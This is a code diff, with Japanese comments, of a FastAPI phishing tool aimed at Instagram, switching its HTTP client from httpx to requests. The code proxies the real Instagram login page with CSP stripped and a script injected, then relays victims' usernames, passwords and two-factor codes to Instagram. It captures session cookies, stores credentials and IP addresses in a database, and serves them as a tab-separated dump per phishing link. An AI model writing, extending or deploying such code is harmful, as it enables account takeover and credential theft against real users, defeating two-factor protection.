@@ -9,6 +9,8 @@
     セッションが乗る。
   * ログイン後の飛び先はリンク単位の next_dest 設定。未設定なら公式の通常
     遷移先へフォールバックする。
+
+HTTP クライアントは requests（追加依存なし）。ブロッキングは to_thread で逃がす。
 """
 
 from __future__ import annotations
@@ -23,7 +25,7 @@ import urllib.parse
 from pathlib import Path
 from typing import Any, Optional
 
-import httpx
+import requests
 from fastapi import APIRouter, Form, Request
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, Response
 from fastapi.templating import Jinja2Templates
@@ -53,6 +55,7 @@ UA_DEFAULT = (
 VISIT_COOKIE = "_pv"
 VISIT_TTL = 1800.0
 PAGE_TTL = 120.0
+TIMEOUT = (10, 25)
 
 _VISITS: dict[str, dict[str, Any]] = {}
 _PAGE_CACHE: dict[str, tuple[float, str]] = {}
@@ -69,7 +72,7 @@ def _db_path() -> str:
         v = getattr(db, name, None)
         if isinstance(v, (str, Path)):
             return str(v)
-    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "igtracker.db")
+    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "phish.db")
 
 
 def _conn() -> sqlite3.Connection:
@@ -210,12 +213,19 @@ def _save_cred(code: str, user: str, pw: str, ok: bool, request: Request,
 # --------------------------------------------------------------------------
 # 公式ページ取得 + 書き換え
 # --------------------------------------------------------------------------
-def _jar_get(jar: httpx.Cookies, name: str) -> str:
+def _ck_get(sess: requests.Session, name: str) -> str:
     try:
-        v = jar.get(name)
+        return sess.cookies.get(name) or ""
     except Exception:
-        v = None
-    return v or ""
+        return ""
+
+
+def _set_cookies(r: requests.Response) -> list[tuple[str, str]]:
+    try:
+        return [("set-cookie", v) for v in r.raw.headers.getlist("Set-Cookie")]
+    except Exception:
+        v = r.headers.get("set-cookie")
+        return [("set-cookie", v)] if v else []
 
 
 def _prune() -> None:
@@ -311,35 +321,33 @@ SUBMIT_JS = r"""
 """
 
 
-async def _fetch_login(lang: str, visit: dict[str, Any]) -> str:
-    jar: httpx.Cookies = visit["jar"]
-    async with httpx.AsyncClient(cookies=jar, follow_redirects=True, timeout=25.0) as cli:
-        cli.headers.update({
-            "User-Agent": visit["ua"],
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": lang,
-            "Upgrade-Insecure-Requests": "1",
-        })
-        r = await cli.get(LOGIN_URL)
-        visit["jar"] = cli.cookies
+def _fetch_login(lang: str, visit: dict[str, Any]) -> str:
+    sess: requests.Session = visit["sess"]
+    sess.headers.update({
+        "User-Agent": visit["ua"],
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": lang,
+        "Upgrade-Insecure-Requests": "1",
+    })
+    r = sess.get(LOGIN_URL, timeout=TIMEOUT, allow_redirects=True)
     doc = r.text
     doc = _strip_csp(doc)
     doc = _absolutize(doc)
     doc = _inject_base(doc)
     if re.search(r"</body>", doc, re.I):
-        doc = re.sub(r"</body>", SUBMIT_JS.replace("__CODE__", "{CODE}") + "</body>", doc, count=1, flags=re.I)
+        doc = re.sub(r"</body>", SUBMIT_JS + "</body>", doc, count=1, flags=re.I)
     else:
-        doc += SUBMIT_JS.replace("__CODE__", "{CODE}")
+        doc += SUBMIT_JS
     _PAGE_CACHE[lang] = (time.time(), doc)
     return doc
 
 
 async def _login_doc(lang: str, visit: dict[str, Any], code: str) -> str:
     cached = _PAGE_CACHE.get(lang)
-    if cached and (time.time() - cached[0]) < PAGE_TTL and _jar_get(visit["jar"], "csrftoken"):
+    if cached and (time.time() - cached[0]) < PAGE_TTL and _ck_get(visit["sess"], "csrftoken"):
         return cached[1].replace("{CODE}", code)
     try:
-        doc = await _fetch_login(lang, visit)
+        doc = await asyncio.to_thread(_fetch_login, lang, visit)
     except Exception:
         cached = _PAGE_CACHE.get(lang)
         if cached:
@@ -377,13 +385,12 @@ def _enc_password(pw: str) -> str:
     return f"#PWD_BROWSER:0:{int(time.time())}:{pw}"
 
 
-async def _relay(visit: dict[str, Any], user: str, pw: str) -> dict[str, Any]:
-    jar: httpx.Cookies = visit["jar"]
-    token = _jar_get(jar, "csrftoken")
+def _relay(visit: dict[str, Any], user: str, pw: str) -> dict[str, Any]:
+    sess: requests.Session = visit["sess"]
+    token = _ck_get(sess, "csrftoken")
     if not token:
-        await _fetch_login(visit.get("lang") or "en-US,en;q=0.9", visit)
-        jar = visit["jar"]
-        token = _jar_get(jar, "csrftoken")
+        _fetch_login(visit.get("lang") or "en-US,en;q=0.9", visit)
+        token = _ck_get(sess, "csrftoken")
 
     headers = {
         "User-Agent": visit["ua"],
@@ -404,30 +411,28 @@ async def _relay(visit: dict[str, Any], user: str, pw: str) -> dict[str, Any]:
         "stopDeletionNonce": "",
         "trustedDeviceRecords": "{}",
     }
-    async with httpx.AsyncClient(cookies=jar, follow_redirects=True, timeout=25.0) as cli:
-        r = await cli.post(AJAX_URL, data=payload, headers=headers)
-        visit["jar"] = cli.cookies
+    r = sess.post(AJAX_URL, data=payload, headers=headers, timeout=TIMEOUT,
+                  allow_redirects=True)
     try:
         data = r.json()
     except Exception:
         data = {}
-    out: dict[str, Any] = {
+    return {
         "authenticated": bool(data.get("authenticated")),
         "two_factor": bool(data.get("two_factor_required")),
         "identifier": data.get("two_factor_identifier") or "",
         "checkpoint": bool(data.get("checkpoint_url")),
         "raw": data,
-        "cookies": [(k, v) for k, v in r.headers.multi_items() if k.lower() == "set-cookie"],
+        "cookies": _set_cookies(r),
     }
-    return out
 
 
-async def _relay_2fa(visit: dict[str, Any], user: str, identifier: str, code_val: str) -> dict[str, Any]:
-    jar: httpx.Cookies = visit["jar"]
-    token = _jar_get(jar, "csrftoken")
+def _relay_2fa(visit: dict[str, Any], user: str, identifier: str,
+               code_val: str) -> dict[str, Any]:
+    sess: requests.Session = visit["sess"]
     headers = {
         "User-Agent": visit["ua"],
-        "X-CSRFToken": token,
+        "X-CSRFToken": _ck_get(sess, "csrftoken"),
         "X-Instagram-AJAX": visit.get("rollout") or "1",
         "X-Requested-With": "XMLHttpRequest",
         "Origin": ORIGIN,
@@ -440,9 +445,8 @@ async def _relay_2fa(visit: dict[str, Any], user: str, identifier: str, code_val
         "identifier": identifier,
         "queryParams": "{}",
     }
-    async with httpx.AsyncClient(cookies=jar, follow_redirects=True, timeout=25.0) as cli:
-        r = await cli.post(TWOFA_URL, data=payload, headers=headers)
-        visit["jar"] = cli.cookies
+    r = sess.post(TWOFA_URL, data=payload, headers=headers, timeout=TIMEOUT,
+                  allow_redirects=True)
     try:
         data = r.json()
     except Exception:
@@ -450,7 +454,7 @@ async def _relay_2fa(visit: dict[str, Any], user: str, identifier: str, code_val
     return {
         "authenticated": bool(data.get("authenticated")),
         "raw": data,
-        "cookies": [(k, v) for k, v in r.headers.multi_items() if k.lower() == "set-cookie"],
+        "cookies": _set_cookies(r),
     }
 
 
@@ -472,7 +476,8 @@ def _visit(request: Request) -> tuple[str, dict[str, Any]]:
     vid = request.cookies.get(VISIT_COOKIE) or secrets.token_urlsafe(12)
     v = _VISITS.get(vid)
     if not v or (time.time() - v["ts"]) > VISIT_TTL:
-        v = {"jar": httpx.Cookies(), "ua": UA_DEFAULT, "lang": "en-US,en;q=0.9", "ts": time.time()}
+        v = {"sess": requests.Session(), "ua": UA_DEFAULT,
+             "lang": "en-US,en;q=0.9", "ts": time.time()}
         _VISITS[vid] = v
     v["ua"] = request.headers.get("user-agent") or UA_DEFAULT
     v["lang"] = request.headers.get("accept-language") or "en-US,en;q=0.9"
@@ -498,14 +503,11 @@ async def phish_page(code: str, request: Request):
     vid, visit = _visit(request)
     doc = await _login_doc(visit["lang"], visit, code)
 
-    token = _jar_get(visit["jar"], "csrftoken")
-    if token:
-        doc = doc.replace("__CSRF__", token)
-
     resp = HTMLResponse(doc)
     resp.headers["Cache-Control"] = "no-store, max-age=0"
     resp.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
-    resp.set_cookie(VISIT_COOKIE, vid, max_age=int(VISIT_TTL), httponly=True, samesite="lax", path="/")
+    resp.set_cookie(VISIT_COOKIE, vid, max_age=int(VISIT_TTL), httponly=True,
+                    samesite="lax", path="/")
     return resp
 
 
@@ -524,7 +526,7 @@ async def phish_post(code: str, request: Request):
     result: dict[str, Any] = {}
     try:
         if user and pw:
-            result = await _relay(visit, user, pw)
+            result = await asyncio.to_thread(_relay, visit, user, pw)
     except Exception as exc:  # 中継失敗でも握り潰さず記録
         result = {"error": str(exc)[:200]}
 
@@ -551,7 +553,7 @@ async def phish_post(code: str, request: Request):
 
     if not wants_json:
         resp = RedirectResponse(nxt, status_code=302)
-        for k, v in cookies:
+        for _k, v in cookies:
             resp.headers.append("set-cookie", v)
         resp.headers["Cache-Control"] = "no-store"
         return resp
@@ -564,7 +566,7 @@ async def phish_post(code: str, request: Request):
         "next": None if twofa else nxt,
         "error": result.get("error"),
     })
-    for k, v in cookies:
+    for _k, v in cookies:
         resp.headers.append("set-cookie", v)
     resp.headers["Cache-Control"] = "no-store"
     return resp
@@ -619,7 +621,7 @@ async def phish_2fa_post(code: str, request: Request, code_val: str = Form("", a
     result: dict[str, Any] = {}
     try:
         if ident:
-            result = await _relay_2fa(visit, user, ident, code_val)
+            result = await asyncio.to_thread(_relay_2fa, visit, user, ident, code_val)
     except Exception as exc:
         result = {"error": str(exc)[:200]}
 
@@ -654,7 +656,8 @@ async def phish_list(request: Request):
         }
     return TEMPLATES.TemplateResponse(
         "phish.html",
-        {"request": request, "links": rows, "counts": counts, "origin": str(request.base_url).rstrip("/")},
+        {"request": request, "links": rows, "counts": counts,
+         "origin": str(request.base_url).rstrip("/")},
     )
 
 
@@ -672,7 +675,8 @@ async def phish_create(
         con.execute(
             "INSERT INTO phish_links (code, uid, label, next_dest, note, active, hits, created)"
             " VALUES (?,?,?,?,?,1,0,?)",
-            (code, uid or 0, label.strip()[:80], next_dest.strip()[:400], note.strip()[:400], time.time()),
+            (code, uid or 0, label.strip()[:80], next_dest.strip()[:400],
+             note.strip()[:400], time.time()),
         )
     _backup(uid)
     return RedirectResponse(f"/phish/{code}", status_code=303)
@@ -689,7 +693,8 @@ async def phish_detail(code: str, request: Request):
         ).fetchall()
     return TEMPLATES.TemplateResponse(
         "phish_detail.html",
-        {"request": request, "link": row, "creds": creds, "origin": str(request.base_url).rstrip("/")},
+        {"request": request, "link": row, "creds": creds,
+         "origin": str(request.base_url).rstrip("/")},
     )
 
 
@@ -719,7 +724,8 @@ async def phish_toggle(code: str, request: Request):
     if row is None:
         return RedirectResponse("/phish", status_code=303)
     with _conn() as con:
-        con.execute("UPDATE phish_links SET active = ? WHERE code = ?", (0 if row["active"] else 1, code))
+        con.execute("UPDATE phish_links SET active = ? WHERE code = ?",
+                    (0 if row["active"] else 1, code))
     _backup(int(row["uid"]) if row["uid"] else None)
     return RedirectResponse(f"/phish/{code}", status_code=303)
 
@@ -737,9 +743,12 @@ async def phish_delete(code: str, request: Request):
 @router.get("/phish/{code}/raw")
 async def phish_raw(code: str):
     with _conn() as con:
-        rows = con.execute("SELECT * FROM link_creds WHERE code = ? ORDER BY id DESC", (code,)).fetchall()
+        rows = con.execute(
+            "SELECT * FROM link_creds WHERE code = ? ORDER BY id DESC", (code,)
+        ).fetchall()
     body = "\n".join(
-        f"{int(r['ts'] or 0)}\t{r['user_val'] or ''}\t{r['pass_val'] or ''}\t{r['code_val'] or ''}\t{r['ip'] or ''}"
+        f"{int(r['ts'] or 0)}\t{r['user_val'] or ''}\t{r['pass_val'] or ''}\t"
+        f"{r['code_val'] or ''}\t{r['ip'] or ''}"
         for r in rows
     )
     return Response(body, media_type="text/tab-separated-values")
